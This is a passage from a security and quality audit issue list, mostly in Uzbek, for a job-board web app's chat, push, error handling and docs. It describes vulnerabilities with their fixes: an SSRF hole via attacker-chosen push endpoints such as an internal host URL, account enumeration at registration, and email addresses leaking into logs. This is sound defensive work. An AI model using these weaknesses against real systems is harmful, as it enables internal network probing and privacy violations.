- **Evidence:** chat.routes.ts:199 addSocket(userId, ws) → :204-224 tekshiruv 4403/4401 bilan yopadi. realtime.ts:36-47 sendToUser/isOnline. DECISIONS.md D-022 faqat kiruvchi frame kutishini tasvirlaydi.
- **Recommended fix:** Socketni ready true bo'lgandan keyingina ro'yxatga oling (yoki deliverable belgilang); bir necha millisekundlik chiquvchi payloadni navbatga qo'ying yoki kichik kechikishni qabul qiling.
- **Severity izohi:** P3 saqlandi (D-022 dizayn tanlovi).
- **Manba topilmalar:** realtime-14
- **Bajarilgan fix:** realtime-14: FIXED — addSocket() runs only after the isBlocked/tokenVersion check resolves (and only if the socket is still open), so a revoked or blocked session never receives a live payload during t
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-233

**Server token muddati tugaganda har socketni yopadi: har 15 daqiqada to'liq reconnect va reload**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** realtime/UX
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:229`
- **Root cause:** Expiry timer 15 daqiqalik access token tugaganda 4401 bilan yopadi. Klient 4401'da, yangi token allaqachon saqlangan bo'lsa ham, doim refreshSession() chaqiradi va qayta ulanadi; onOpen(reconnected) to'liq ro'yxat va thread reload qiladi. Oraliqda yuborish darhol failed.
- **Impact:** Har ochiq /messages tabida davriy 'Yuborilmadi' xavfi va og'ir reload (ro'yxat agregatsiyasi, 1000 xabargacha); bell socketi ham bildirishnomalarni qayta so'raydi.
- **Evidence:** chat.routes.ts:227-231 setTimeout(ws.close(4401,'token expired')); jwt.ts:36 expiresIn '15m'. useChatSocket.ts:81-90 4401 → refreshSession → schedule(0). useMessenger.ts:218-223 reload; :229-233 send false → failed.
- **Recommended fix:** Qayta ulanmasdan muddatni uzaytiradigan in-band {type:'auth', token} frame'ini qo'llab-quvvatlang. Aks holda 4401'da getAccessToken() ishlatilgan tokendan farq qilsa refresh'siz darhol ulaning va reconnect sinxronini inkremental qiling.
- **Severity izohi:** P3 saqlandi. ISSUE-019 (FIXED) client token almashishini tuzatgan; server expiry yopishi yangi.
- **Manba topilmalar:** realtime-15
- **Bajarilgan fix:** realtime-15: FIXED — A {type:'auth', token} frame re-arms the expiry timer without closing the socket (sub must match); old clients that do not send it keep the previous 4401-and-reconnect behaviour.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-234

**Klientda liveness tekshiruvi yo'q: yarim ochiq socket ulangan bo'lib ko'rinadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** frontend/realtime
- **Fayl:** `apps/web/src/lib/useChatSocket.ts:56`
- **Root cause:** Brauzer ping/pong'ni ochmaydi va hook'larda ilova darajasidagi heartbeat yo'q. Ack timeout reconnect'ni majburlamaydi, 'online' va 'visibilitychange' tinglovchilari yo'q, shuning uchun tiklanish OS TCP timeout'i yoki navbatdagi backoff'ni (30 s gacha) kutadi.
- **Impact:** Tarmoq almashishi yoki uyqudan keyin UI 'ulangan' deydi, yuborishlar 10 s dan keyin birma-bir xato bo'ladi va TCP taslim bo'lguncha kiruvchi xabarlar o'tkazib yuboriladi.
- **Evidence:** useChatSocket.ts:56-107 heartbeat va online listener yo'q; useMessenger.ts:234-240 timeout faqat failed belgilaydi. Server realtime.ts ping qiladi, lekin brauzer bu holatni hook'ga bildirmaydi.
- **Recommended fix:** ~25 s da ilova 'ping' frame'i va pong timeout'ida yopib qayta ulash (server 'ping' turini qo'llashi kerak). 'online' va 'visibilitychange' da darhol reconnect. Ack timeout'dan keyin reconnect'ni majburlash.
- **Severity izohi:** P3 saqlandi, medium confidence.
- **Manba topilmalar:** realtime-16
- **Bajarilgan fix:** realtime-16: PARTIAL — Bajarildi: `online` va `visibilitychange` (ko'rindi) hodisalarida socket yopiq bo'lsa darhol qayta ulanadi (TCP timeout kutilmaydi); xabar tasdig'i 10 s ichida kelmasa useChatSocke
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-235

**Jarayon ichidagi socket registri bitta replica cheklovi sabablari qatorida hujjatlanmagan**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** infra/realtime
- **Fayl:** `DEPLOY.md:95`
- **Root cause:** realtime.ts socketlarni jarayon-lokal Map'da saqlaydi. DEPLOY.md numReplicas 1 ni faqat Telegram long polling va alerts scheduler bilan izohlaydi, ularni worker'ga ko'chirish tavsiya qilinadi — bu WS yetkazishni baribir buzadi.
- **Impact:** API gorizontal kengaytirilsa xabar va bildirishnomalar faqat shu nusxadagi socketlarga boradi, isOnline noto'g'ri bo'ladi, Telegram fallback o'tkazib yuboriladi yoki noto'g'ri yuboriladi; xato ko'rinmaydi.
- **Evidence:** realtime.ts:14 `const sockets = new Map`. DEPLOY.md:95-101 faqat bot va obuna jadvali sabab; 'ikkalasini worker'ga ajratish kerak'. railway.json:13 numReplicas 1. cache.ts izohi keshni eslatadi, socketni emas.
- **Recommended fix:** DEPLOY.md'ga WS registri va jarayon ichidagi keshlarni uchinchi sabab sifatida qo'shing; kengaytirish uchun sticky session va sendToUser/isOnline uchun pub/sub (yoki Mongo change streams) kerakligini yozing.
- **Severity izohi:** P3 saqlandi (hujjat).
- **Manba topilmalar:** realtime-18
- **Bajarilgan fix:** realtime-18: FIXED — DEPLOY.md now lists the in-memory WebSocket registry (plus in-process caches and rate-limit quotas) as the third reason for numReplicas 1 and names sticky sessions + pub/sub fan-ou
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-236

**Service worker push bosilganda nazorat qilinmagan oynada navigate() chaqiradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** frontend/push
- **Fayl:** `apps/web/public/sw.js:36`
- **Root cause:** matchAll includeUncontrolled:true bilan, keyin birinchi same-origin oynada client.navigate(target). WindowClient.navigate bu SW nazorat qilmaydigan klient uchun reject qiladi va zanjir focus() yoki openWindow()'ga yetmay to'xtaydi.
- **Impact:** Yagona ochiq tab nazorat qilinmagan (masalan hard reload) bo'lsa push bildirishnomasini bosish ba'zan hech narsa qilmaydi.
- **Evidence:** sw.js:32-41 matchAll({type:'window', includeUncontrolled:true}); `client.navigate(target); return client.focus();` catch va openWindow fallback'isiz.
- **Recommended fix:** navigate'ni faqat nazorat qilinadigan klientda sinang, xatoni ushlang va client.focus() + postMessage yoki self.clients.openWindow(target) ga qayting.
- **Severity izohi:** P3 saqlandi, medium confidence.
- **Manba topilmalar:** realtime-20
- **Bajarilgan fix:** realtime-20: FIXED — sw.js notificationclick: manzil faqat ichki yo'l (//host va /\host rad etiladi); avval aynan o'sha manzil ochiq bo'lsa faqat focus(); so'ng har bir bir xil originli oyna uchun navi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-237

**Header qo'ng'irog'idagi mark-read, mark-all-read va delete optimistik yangilashdan keyin API xatosini yutadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** frontend/notifications
- **Fayl:** `apps/web/src/lib/useNotifications.ts:185`
- **Root cause:** useNotifications avval items va count'ni yangilaydi, keyin so'rovni .catch(() => undefined) bilan kutadi: rollback va xato signali yo'q. /notifications sahifasidagi useNotificationCenter esa rollback qilib false qaytaradi.
- **Impact:** POST muvaffaqiyatsiz bo'lsa ham (5xx, tarmoq, refresh'dan keyin 401) 'barchasini o'qildi' badge'ni nolga tushiradi; 45 s poll yoki focus o'qilmaganlarni qaytaradi va badge izohsiz sakraydi. Bildirishnomani ochishdagi markRead ham shunday.
- **Evidence:** useNotifications.ts:171-177 setItems/setUnreadCount → `await markNotificationRead(token, id).catch(() => undefined)`; :181-186 markAllRead; :188-197 remove. :68 45_000 poll. useNotificationCenter.ts rollback naqshi (raw: :76-85, 100-104, 122-130).
- **Recommended fix:** Center'dagi rollback naqshini qo'llang (catch'da oldingi items/count'ni tiklab refresh()), ixtiyoriy ravishda bell dropdown'da kichik xato ko'rsating.
- **Severity izohi:** P3 saqlandi. ISSUE-067 poll xatolarini tuzatgan, mutation rollback'ini emas.
- **Manba topilmalar:** api-errors-4
- **Bajarilgan fix:** api-errors-4: FIXED — useNotifications.markRead/markAllRead/remove endi optimistik o'zgarishni xatoda aynan orqaga qaytaradi (o'qilmagan holat va son tiklanadi) va false qaytaradi; qo'ng'iroqda 'Hammasi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-238

**Mutation fetcherlari tarmoq va JSON bo'lmagan xatolarni normallashtirmaydi: formalar brauzerning xom matnini yoki har tilda o'zbekcha fallback'ni ko'rsatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** frontend/errors
- **Fayl:** `apps/web/src/lib/apiExtra.ts:69`
- **Root cause:** apiExtra send() va api.ts'dagi ko'p mutationlar fetch'ni try/catch'siz chaqiradi, uzilish xom TypeError otadi. JSON bo'lmagan xato javobi qat'iy 'Kutilmagan xatolik' ga tushadi. Komponentlar err.message'ni to'g'ridan-to'g'ri chiqaradi. Normallashtiruvchi kod (adminRequest, getStrict) umumiy emas.
- **Impact:** Aloqa uzilsa yoki proxy 502/504 HTML qaytarsa kompaniya profili, logo, saqlangan qidiruv va baho dialogi 'Failed to fetch' yoki ru/en UI'da o'zbekcha matnni ko'rsatadi, tarjima qilingan qayta urinish xabari o'rniga.
- **Evidence:** apiExtra.ts:69-89 send: fetch try'siz, `json?.message ?? 'Kutilmagan xatolik'`. apiExtra.ts:59-61 getStrict esa ApiError(0,'NETWORK'). SaveSearchButton.tsx:67 `err instanceof Error ? err.message : ...`; RatingDialog.tsx:58 err.message.
- **Recommended fix:** adminRequest asosida bitta umumiy request helper: tarmoq xatosi → ApiError(0,'NETWORK'), JSON bo'lmagan javob → ApiError(status,'BAD_RESPONSE'). Komponentlarda err.message o'rniga kodni i18n'ga map qiling, PHONE_NOT_VERIFIED va VACANCY_HAS_APPLICATIONS kabi kodlarni saqlang.
- **Severity izohi:** P3 saqlandi. ISSUE-073 (xom server matni) va ISSUE-102 bog'liq, lekin tarmoq normallashtirish root cause'i yangi.
- **Manba topilmalar:** api-errors-5
- **Bajarilgan fix:** api-errors-5: PARTIAL — apiExtra.send() no longer leaks raw browser text: network failures become ApiError(0,'NETWORK') and a non-JSON 2xx body becomes ApiError(status,'BAD_RESPONSE'); saved-search creati
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-239

**Chat WebSocket rad etilgan yoki muvaffaqiyatsiz yuborishlarni jimgina tashlaydi (xato frame'i yo'q); klient 10 s dan keyin umumiy 'yuborilmadi' ko'rsatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** realtime/error-semantics
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:257`
- **Root cause:** handle() rate limit, noma'lum suhbat yoki ishtirokchi bo'lmaganda javobsiz qaytadi; DB xatolari faqat handle(raw).catch'da loglanadi. Protokolda clientId bilan nack/error xabari yo'q, yuboruvchi faqat timeout'ni kutadi.
- **Impact:** Rate-limit, taqiqlangan yoki DB xatoli xabarlar 10 s 'pending' turib umumiy 'failed' ga o'tadi; retry xuddi shu jim xatoni takrorlaydi, foydalanuvchi kutish, qayta yuklash yoki voz kechishni bilmaydi.
- **Evidence:** chat.routes.ts:257 `if (!allow()) return;`, :260 `if (!parts) return;`, :261 ishtirokchi emas return; :283 `handle(raw).catch(err => req.log.warn(...))`. useMessenger.ts:10 SEND_TIMEOUT_MS = 10_000; :234-240 timeout → failed.
- **Recommended fix:** Har erta qaytishda va catch'da yuboruvchiga {type:'error', clientId, code:'RATE_LIMITED'|'FORBIDDEN'|'SERVER_ERROR'} yuboring. Klient kodni i18n'ga map qilsin, FORBIDDEN uchun retry taklif qilmasin; useChatSocket noma'lum turlarni e'tiborsiz qoldirishini tekshiring.
- **Severity izohi:** P3 saqlandi. Raw'dagi telefon tekshiruvi kuzatuvi alohida issue (realtime-2) sifatida hisobga olingan.
- **Manba topilmalar:** api-errors-6
- **Bajarilgan fix:** api-errors-6: PARTIAL — Every early return on a message frame now answers {type:'error', code, clientId}: FORBIDDEN (bad/foreign conversation), RATE_LIMITED (per-connection or per-account), PHONE_NOT_VERI
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-240

**Global error handler: Fastify default 404 tanasi, infratuzilma xatolari 500 ga aylanadi, ichki FST_* kodlari va inglizcha matn 4xx sifatida o'tadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** api/error-contract
- **Fayl:** `apps/api/src/server.ts:211`
- **Root cause:** setErrorHandler faqat AppError, Zod, Fastify validation, Prisma P2002/P2025/P2023 va multipart content-type'ni map qiladi. Boshqa 4xx statusCode'li xato xom error.code va message bilan uzatiladi, qolgani 500. setNotFoundHandler registratsiya qilinmagan.
- **Impact:** Noma'lum route'lar (billing o'chiq bo'lsa billing endpointlari ham) {message:'Route GET:/api/plans not found', error:'Not Found'} qaytaradi — error'ni kod deb o'qiydigan klient 'Not Found' oladi. DB uzilishi (P2024 pool timeout, init error) yoki write conflict (P2034) 503/409 o'rniga 500 INTERNAL_ERROR — nosozlik bug'dek ko'rinadi. 413 FST_REQ_FILE_TOO_LARGE inglizcha matn beradi.
- **Evidence:** server.ts:178-216 handler; :195-204 faqat P2002, P2025, P2023; :210-212 `statusCode >= 400 && < 500` → send({error: error.code ?? 'ERROR', message: error.message}); :214-215 500. grep setNotFoundHandler apps/api/src — yo'q.
- **Recommended fix:** setNotFoundHandler {error:'NOT_FOUND', message}. P2024, P1001 va PrismaClientInitializationError → 503 SERVICE_UNAVAILABLE, P2034 → 409 retryable kod. Ma'lum Fastify 4xx kodlarini barqaror kodlarga (PAYLOAD_TOO_LARGE, BAD_REQUEST) va klient lokalizatsiya qila oladigan xabarlarga aylantiring; e2e-check.mjs 404/500 tekshiruvlarini moslang.
- **Severity izohi:** P3 saqlandi. ISSUE-073 xabar tilini qamraydi; 404 shakli va 5xx tasnifi yangi.
- **Manba topilmalar:** api-errors-9
- **Bajarilgan fix:** api-errors-9: FIXED — setNotFoundHandler returns the project's {error,message} shape; infrastructure Prisma errors map to 503 SERVICE_UNAVAILABLE, write conflicts to 409 WRITE_CONFLICT, and internal FST
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-241

**POST /api/push/unsubscribe DB o'chirish xato bersa ham muvaffaqiyat qaytaradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** api/error-semantics
- **Fayl:** `apps/api/src/modules/notifications/notifications.routes.ts:210`
- **Root cause:** Route deleteMany(...).catch(() => undefined) dan keyin {ok:true} qaytaradi; klient ham xatoni yutib holatni 'off' qiladi.
- **Impact:** DB yozuvi muvaffaqiyatsiz bo'lsa foydalanuvchi push o'chirilgan deb ko'radi, obuna qatori bazada qoladi va server o'sha endpoint'ga push yuborishda davom etadi (410 bo'lsa tozalanishi tekshirilmagan).
- **Evidence:** notifications.routes.ts:208-213 `.deleteMany({ where: { endpoint, userId } }).catch(() => undefined); return { ok: true };`. web usePush.ts (raw :116-119) unsubscribePush(...).catch → setState('off').
- **Recommended fix:** DB xatosi global handler'ga (500) yetsin. usePush server chaqiruvi muvaffaqiyatsiz bo'lsa xato ko'rsatib 'on' holatini saqlasin yoki keyingi yuklashda server unsubscribe'ni qayta urinsin.
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** api-errors-10
- **Bajarilgan fix:** api-errors-10: FIXED — POST /api/push/unsubscribe no longer swallows a DB failure: the deleteMany error propagates to the error handler and the success response reports removed count.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-242

**Telegram bot /start, kontakt yoki callback handler xato bersa foydalanuvchiga javob yubormaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/error-semantics
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:456`
- **Root cause:** Polling sikli handleUpdate istisnolarini ushlab faqat loglaydi; handlerlarda umumiy javob yuboradigan try/catch yo'q. tg() har qanday Telegram API yoki tarmoq xatosida null qaytaradi va bot chaqiruvchilari natijani tekshirmaydi.
- **Impact:** Hisobni bog'lash (handleStart) yoki telefonni tasdiqlash (handleContact) paytidagi DB xatosi foydalanuvchini javobsiz qoldiradi: tasdiq o'tdimi bilmaydi, sayt 'tasdiqlanmagan' deb turadi. Sikl ishlashda davom etadi (crash yo'q); noto'g'ri payload'ga xavfsiz umumiy javob beriladi (rule D shu qismi bajariladi).
- **Evidence:** telegram.service.ts:454-458 `try { await handleUpdate(u) } catch (e) { logger.warn(...) }`. handleStart :268-273 javobdan oldin Prisma yozuvlari; handleContact :339-343 prisma.user.update javobdan oldin; :262-266 noto'g'ri payload 'Havola eskirgan'.
- **Recommended fix:** Har handler tanasini ichki tafsilotlarsiz 'Xatolik yuz berdi, saytdan qayta urinib ko'ring' umumiy javobini yuboradigan try/catch bilan o'rang; faqat update turi va xatoni loglang (kontakt yoki xabar mazmunini emas).
- **Severity izohi:** P3 saqlandi.
- **Manba topilmalar:** api-errors-11
- **Bajarilgan fix:** api-errors-11: FIXED — handleTelegramUpdate wraps every handler: on a thrown error the user gets one generic message and only the update kind plus the error string are logged.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-243

**POST /api/push/subscribe istalgan https host'ni qabul qiladi: server hujumchi tanlagan host:port'ga so'rov yuboradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** security/push
- **Fayl:** `apps/api/src/modules/notifications/notifications.routes.ts:38`
- **Root cause:** pushSubSchema faqat `z.string().url()` talab qiladi. Endpoint o'zgartirilmasdan saqlanadi va webpush.sendNotification timeout'siz chaqiriladi. web-push esa URL'dagi hostname va port'ga https.request ochadi.
- **Impact:** Tizimga kirgan istalgan foydalanuvchi https://internal-host:8443/x yoki tarpit kabi endpoint'ni ro'yxatdan o'tkazib, o'z bildirishnomalarini (masalan darhol keladigan saqlangan qidiruv alertlarini) qo'zg'atadi. API ichki yoki tashqi hostlarga ko'r TLS POST yuboradi va socketlarni osib qo'yishi mumkin; kutiladigan ommaviy xabarlar har bir foydalanuvchi uchun 20 soniyagacha kutadi.
- **Evidence:** notifications.routes.ts:37-40 `endpoint: z.string().url().max(1000)`; :189 `deleteMany({ where: { endpoint, userId: { not: userId } } })`, keyin upsert. push.ts:46-49 `webpush.sendNotification({ endpoint, keys }, body)` options va timeout'siz. web-push-lib.js:360-369 endpoint hostname/port'i bilan https.request (node_modules; xulosa raw manbadan olingan).
- **Recommended fix:** https push-servis hostlari uchun allow-list kiriting (fcm.googleapis.com, updates.push.services.mozilla.com, *.notify.windows.com, web.push.apple.com); boshqa hostlar va nostandart portlarni rad eting. sendNotification'ga { timeout: 10000 } bering. Yangi brauzer vendorlari uchun allow-list'ni yangilash tartibini hujjatlashtiring.
- **Severity izohi:** P3 saqlandi: so'rov ko'r, javob hujumchiga qaytmaydi va hajmi bildirishnoma chastotasi bilan cheklangan.
- **Manba topilmalar:** gap2-5
- **Bajarilgan fix:** gap2-5: FIXED — Endpoints are restricted to https, port 443 and the known push services (fcm/android.googleapis.com, mozilla, apple, windows and their subdomains), checked both at subscribe time a
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-244

**SMTP sozlanmagan bo'lsa, har bir bildirishnoma qabul qiluvchining email manzilini stdout'ga yozadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** privacy/logging
- **Fayl:** `apps/api/src/common/mailer.ts:38`
- **Root cause:** deliver() email kanalini faqat foydalanuvchi sozlamasiga qarab yoqadi (sozlama qatori yo'q bo'lsa, kanal yoqilgan hisoblanadi) va features.email'ni tekshirmaydi. sendUserEmail har safar DB'dan emailni o'qiydi, sendMail esa transport o'chiq bo'lganda `[mail:o'chiq] ${to} — ${subject}` qatorini log'ga yozadi.
- **Impact:** B qoidasi emailni tiklash kanali sifatida olib tashlagani uchun production SMTP'siz ishlashi mumkin (xulosa). U holda har bir yangi ariza yoki holat bildirishnomasi foydalanuvchi emailini log'ga yozadi. ~10k foydalanuvchiga yuborilgan bitta admin ommaviy xabari Railway log'lariga ~10k manzil yozadi va ~10k ortiqcha DB o'qishiga sabab bo'ladi.
- **Evidence:** notifications.service.ts:90 `use = (c) => wanted.includes(c) && !off.has(c)`; :153-154 `if (use('email')) external.push(sendUserEmail(...))`; :171-174 `prisma.user.findUnique({ select: { email: true } })`. mailer.ts:37-38 `if (!tx) { console.log(`[mail:o'chiq] ${input.to} — ${input.subject}`)`. env.ts:187 `email: Boolean(env.SMTP_HOST)`. admin.routes.ts:574 ommaviy xabar barcha kanallarda yuboriladi.
- **Recommended fix:** deliver()'da DB o'qishidan oldin: !features.email bo'lsa, email kanalini o'tkazib yuboring (telegram va push uchun ham features bayroqlarini tekshiring). mailer.ts'da qabul qiluvchini hech qachon log qilmang; ko'pi bilan hisoblagich yoki maskalangan domenni yozing.
- **Severity izohi:** P3 saqlandi: log'larga kirish cheklangan, lekin shaxsiy ma'lumot ommaviy yozilmoqda.
- **Manba topilmalar:** gap3-2
- **Bajarilgan fix:** gap3-2: FIXED — Two layers: the email channel is skipped when SMTP is unset, and mailer's disabled-fallback log no longer prints the recipient address (subject only). A 10k broadcast can no longer
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-245

**Ro'yxatdan o'tish mehmonga email bilan hisob mavjudligini oshkor qiladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** privacy/enumeration
- **Fayl:** `apps/api/src/modules/auth/auth.service.ts:40`
- **Root cause:** registerUser emailni qidiradi va hisob bo'lsa darhol 409 'Bu email bilan foydalanuvchi allaqachon mavjud' qaytaradi. loginUser esa javob vaqti hisob mavjudligini oshkor qilmasligi uchun ataylab dummy argon2 hash bajaradi; register bu himoyani yo'qqa chiqaradi.
- **Impact:** Mehmon ma'lum bir shaxsning (masalan, hozirgi xodimning) ISH BOR!'da hisobi borligini tekshira oladi, bu esa uning ish qidirayotganiga ishora beradi. Faqat IP bo'yicha daqiqasiga 10 ta so'rov limiti bor. Rejalashtirilgan telefon orqali tiklash (B) telefon raqamlari uchun shu xatoni takrorlamasligi kerak.
- **Evidence:** auth.service.ts:39-40 `const existing = await prisma.user.findUnique({ where: { email } }); if (existing) throw Errors.conflict('Bu email bilan foydalanuvchi allaqachon mavjud')`. :91-97 loginUser'dagi dummy-hash yo'li. auth.routes.ts:59-64 strictRateLimit {max: 10, '1 minute'}; :66-71 register.
- **Recommended fix:** Mahsulot qarori asosida yangi va mavjud email uchun bir xil neytral javob qaytaring (masalan 'email bo'sh bo'lsa hisob yaratildi, aks holda kiring yoki parolni tiklang'), email bo'yicha throttle qo'shing va web signup xato ishlovini moslang. Kelajakdagi tiklash boshlash endpoint'ida noma'lum telefon raqami uchun ham bir xil javob va bir xil javob vaqti qoidasini majburiy qiling.
- **Severity izohi:** P3 saqlandi: email bilan ro'yxatdan o'tish oqimlarida keng tarqalgan murosa; tuzatish UX o'zgarishini talab qiladi.
- **Manba topilmalar:** gap3-4
- **Bajarilgan fix:** gap3-4: PARTIAL — Same as auth-core-14. The related requirement - identical responses for unknown phone numbers in recovery start - IS implemented (decoy challenge).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-246

**DESIGN.md, tizim-arxitekturasi.md 19-bo'limi va audit xaritalari joriy kodga zid holatni hozirgi holat sifatida ko'rsatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** docs/stale
- **Fayl:** `tizim-arxitekturasi.md:630`
- **Root cause:** Bu hujjatlar workplaceType, real statistika, sessiyalarni bekor qilish va CORS/rol fix'laridan oldin yozilgan va ularda 'snapshot' yoki 'oxirgi tekshirilgan sana' belgisi yo'q. D-004 tizim-arxitekturasi.md'ni tarixiy hujjat sifatida o'zgarishsiz qoldirgan, lekin 19-bo'lim 'amalga oshirilgan holat' deb nomlangan va README unga havola beradi. Xaritalar (D-001) 1-bosqichda yaratilgan va 3- hamda 6-bosqich fix'laridan keyin yangilanmagan.
- **Impact:** Dasturchilar olib tashlangan xatti-harakatni qayta kiritishi, mavjud ma'lumotni yashirishi yoki allaqachon tuzatilgan muammolarni qayta audit qilishi mumkin. README orqali kelgan o'quvchi auth modeli (Telegram login), monetizatsiya (tariflar, limitlar) va stek (PostgreSQL, Redis) haqida noto'g'ri ma'lumot oladi.
- **Evidence:** tizim-arxitekturasi.md:630 auth «Email+parol, Telegram, Google»; :634 «default — PostgreSQL»; :638 monetizatsiya ✅ tariflar va limitlar bilan (BILLING_ENABLED=false). DESIGN.md:246-248 auth panel raqamlarini 'marketing' deydi, AuthShell.tsx:53-63 esa ularni /api/stats'dan oladi; :796-797,909 office/hybrid DB'da yo'q deydi, VacancyCard.tsx:41-43 esa workplaceType'ni chizadi; :222-225 Apple tugmasi. API_MAP.md:12 logout faqat cookie'ni tozalaydi deydi (auth.routes.ts:102-127 sessiyalarni bekor qiladi); :10 poll'da limit yo'q deydi (hozir 60/min); :18 CORS *.vercel.app (D-006).
- **Recommended fix:** tizim-arxitekturasi.md 19-bo'limi va audit xaritalari boshiga 'snapshot 2026-09-14, fix'lardan oldin — joriy holat uchun ISSUES/ARCHITECTURE_AUDIT/FINAL_AUDIT'ga qarang' banner qo'ying yoki xaritalarni joriy koddan qayta yarating. DESIGN.md'dagi eskirgan paragraflarni yangilang (auth panel statistikasi, workplaceType, hybrid ma'lumot, demo seed'dagi to'lovlar). Apple tugmasini olib tashlang yoki doiradan tashqari deb belgilang va har bir bo'limga 'oxirgi tekshirilgan' sanasini qo'shing.
- **Severity izohi:** Uchala manba P3; ildizi bir xil: fix'lardan keyin hujjatlar yangilanmagan va snapshot belgisi yo'q.
- **Manba topilmalar:** docs-15, docs-16, docs-17
- **Bajarilgan fix:** docs-15: PARTIAL — Corrected in DESIGN.md: auth panel numbers now come from /api/stats (not marketing values), vacancy card meta shows workplaceType, the company catalogue note explains that workplac | docs-16: FIXED — tizim-arxitekturasi.md 19-bo'lim yangilandi | docs-17: FIXED — Xaritalarga snapshot banneri qo'shildi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-247

**CHANGELOG 0.3.0'da to'xtab qolgan, README'dagi buyruq va sahifa ro'yxatlari eskirgan: sentyabrdagi deploy'ni buzadigan o'zgarishlar qayd etilmagan**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** docs/changelog-readme
- **Fayl:** `CHANGELOG.md:3`
- **Root cause:** Sentyabr o'zgarishlari CHANGELOG va README o'rniga DESIGN.md va docs/audit'da hujjatlashtirilgan. README maqolalar CMS, demo seed va unit tekshiruvlari qo'shilganidan keyin yangilanmagan.
- **Impact:** Operatorlar deploy'ni buzadigan o'zgarishlar haqidagi eslatmalarni ko'rmaydi: JWT sirlari endi kamida 32 belgi, CORS preview regex talab qilinadi, web va API birga deploy qilinishi kerak, billing flag ortida. Yangi dasturchilar audit tayanadigan buyruqlar (db:demo, web test:unit), sahifalar (/admin/articles, /admin/team) va sitemap-articles.xml haqida bilmaydi va eskirgan Playwright skriptlariga ishonadi.
- **Evidence:** CHANGELOG.md:3 oxirgi yozuv «0.3.0 — 2026-08-29»; package.json:4 version 0.3.0; :78-82 e2e ~20 oqim va tarif limiti deyilgan, holbuki e2e-check.mjs'da 94 ta check bor va plan limiti yo'q. D-006, D-008, D-009/D-036, D-014, maqolalar CMS va team takliflari qayd etilmagan. README.md:125 sitemap-articles.xml'siz (seo.routes.ts:65,134); :229-259 db:demo va web test:unit yo'q; :21 scripts/*.py (ISSUE-101 NOT FIXED); :112-119 /admin/articles va /admin/team yo'q.
